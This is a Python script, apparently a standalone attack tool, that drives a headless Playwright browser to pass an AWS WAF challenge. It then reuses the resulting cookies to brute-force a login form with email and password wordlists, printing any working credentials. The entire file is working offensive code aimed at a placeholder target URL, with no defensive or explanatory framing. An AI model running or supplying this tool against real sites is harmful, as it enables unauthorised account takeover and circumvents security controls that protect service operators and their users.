from playwright.sync_api import sync_playwright
import requests
import time

class AWSWafChallengeBypass:
    def __init__(self, url, email_file, password_file):
        self.url = url
        self.email_file = email_file
        self.password_file = password_file
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Accept": "*/*",
        })
        
    def load_file_contents(self, filename):
        """Load contents from a file and return as a list"""
        try:
            with open(filename, 'r') as file:
                return [line.strip() for line in file.readlines()]
        except FileNotFoundError:
            print(f"Error: Could not find file {filename}")
            return []

    def solve_waf_challenge(self):
        """Use Playwright to solve the WAF challenge and get the token"""
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()

            try:
                # Navigate to the URL
                response = page.goto(self.url)
                print("\nSolving WAF challenge...")
                
                # Wait for challenge to complete
                page.wait_for_load_state('networkidle')
                time.sleep(2)  # Additional wait for challenge completion

                # Get all cookies after challenge
                cookies = context.cookies()
                
                # Update requests session with the new cookies
                for cookie in cookies:
                    self.session.cookies.set(
                        name=cookie['name'],
                        value=cookie['value'],
                        domain=cookie['domain'],
                        path=cookie['path']
                    )
                
                print("Challenge solved, cookies obtained")
                return True

            except Exception as e:
                print(f"Error solving WAF challenge: {e}")
                return False
            finally:
                browser.close()

    def make_request(self, email, password):
        """Make a request using the requests library"""
        try:
            response = self.session.post(self.url, data={'email': email, 'password': password})
            
            # Print response details
            print(f"\nStatus: {response.status_code}")
            # If we get a WAF challenge
            if response.status_code == 202 or 'x-amzn-waf-action' in response.headers:
                print("\nWAF Challenge detected, switching to Playwright...")
                if self.solve_waf_challenge():
                    # Retry the request with new cookies
                    return self.make_request(email, password)
                
            return response

        except Exception as e:
            print(f"Request error: {e}")
            return None

    def brute_force(self):
        """Brute force the endpoint with email/password combinations"""
        emails = self.load_file_contents(self.email_file)
        passwords = self.load_file_contents(self.password_file)

        if not emails or not passwords:
            print("Error: Email or password list is empty")
            return

        for email in emails:
            for password in passwords:
                print(f"\nTrying - Email: {email}, Password: {password}")
                
                response = self.make_request(email, password)
                if not response:
                    continue

                # Check for successful login
                if response.status_code == 200:
                    print(f"\nSuccess! Credentials found:")
                    print(f"Email: {email}")
                    print(f"Password: {password}")
                    print(f"Response: {response.text}")
                    return
                
                time.sleep(1)  # Delay between attempts

def main():
    waf_bypass = AWSWafChallengeBypass(
        url="<TARGET_URL>",
        email_file="<email_list_file>",
        password_file="<password_list_file>"
    )
    waf_bypass.brute_force()

if __name__ == "__main__":
    main()
